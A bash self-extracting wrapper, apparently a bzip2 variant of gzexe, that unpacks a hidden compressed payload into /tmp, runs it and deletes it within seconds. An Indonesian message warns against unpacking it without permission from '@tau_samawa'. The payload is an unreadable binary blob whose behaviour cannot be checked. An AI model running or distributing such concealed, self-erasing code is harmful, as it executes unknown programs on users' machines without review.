#!/bin/bash
skip=23
set -C
umask=`umask`
umask 77
tmpfile=`tempfile -p gztmp -d /tmp` || exit 1
if /usr/bin/tail -n +$skip "$0" | /bin/bzip2 -cd >> $tmpfile; then
  umask $umask
  /bin/chmod 700 $tmpfile
  prog="`echo $0 | /bin/sed 's|^.*/||'`"
  if /bin/ln -T $tmpfile "/tmp/$prog" 2>/dev/null; then
    trap '/bin/rm -f $tmpfile "/tmp/$prog"; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile "/tmp/$prog") 2>/dev/null &
    /tmp/"$prog" ${1+"$@"}; res=$?
  else
    trap '/bin/rm -f $tmpfile; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile) 2>/dev/null &
    $tmpfile ${1+"$@"}; res=$?
  fi
else
  echo MAU DIBONGKAR YA BANG ? IZIN DULU KE @tau_samawa $0; exit 1
fi; exit $res
BZh91AY&SYH�d�  �_� ]�� >���@�(A� b4��)�2��  ��d �C 0*��P���$�LL����HH�]k�<:�3��s+UW�O4��O[BJR%)��RT��~�ȱ�B�H0۷U�!"�w/l������O�����л�.�����^<���G��9���[������>t�:�g[ԭ�q�:q�i��͸Z����t���t�g�I$�I$�9�i+��aF#�_�X�gQ~�����T`4Ұ0�h�R,*¬+@-�3 Y�� ���U�����;��8Ѻ��wQ��#-e���,VO��"D�G�o"�Tk��т�Q$�֔��K�È��7m�����JʶI�겹EF��k+d��]%�W3��:���])�{����)�GK&x